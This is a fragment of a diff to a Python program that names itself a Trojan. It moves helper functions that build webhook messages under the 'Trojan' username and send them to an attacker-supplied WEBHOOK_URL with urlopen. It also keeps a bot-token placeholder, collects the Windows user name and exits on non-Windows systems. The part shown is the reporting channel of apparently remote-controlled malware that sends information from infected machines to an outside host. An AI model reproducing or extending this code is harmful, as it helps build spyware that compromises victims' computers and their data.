@@ -2,23 +2,7 @@ TOKEN = " # BOT TOKEN # "
 WEBHOOK_URL = " # WEBHOOK URL # "
 
 
-def webhook_info(content, username="Trojan"):
-    webhook = {
-        "content": content,
-        "embeds": "",
-        "username": "Trojan",
-        "avatar_url": "https://immagini.tpadev.repl.co/trojan.png" 
-    }
-    return webhook
 
-def getheaders(token=None, content_type="application/json"):
-    headers = {
-        "Content-Type": content_type,
-        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
-    }
-    if token:
-        headers.update({"Authorization": token})
-    return headers
 
 try:
     import GPUtil
@@ -54,11 +38,30 @@ try:
     import win32process
 except Exception as e:
     urlopen(Request(WEBHOOK_URL, data=dumps(webhook_info(f"ERROR:\n```\n{e}\n```")).encode(), headers=getheaders()))
+if os.name != "nt":
+    exit()
+    
+def webhook_info(content, username="Trojan"):
+    webhook = {
+        "content": content,
+        "embeds": "",
+        "username": "Trojan",
+        "avatar_url": "https://immagini.tpadev.repl.co/trojan.png" 
+    }
+    return webhook
+
+def getheaders(token=None, content_type="application/json"):
+    headers = {
+        "Content-Type": content_type,
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
+    }
+    if token:
+        headers.update({"Authorization": token})
+    return headers
 
 pc_name = os.getenv("UserName")
 
-if os.name != "nt":
-    exit()
+
 
 system = platform.system()
 try:
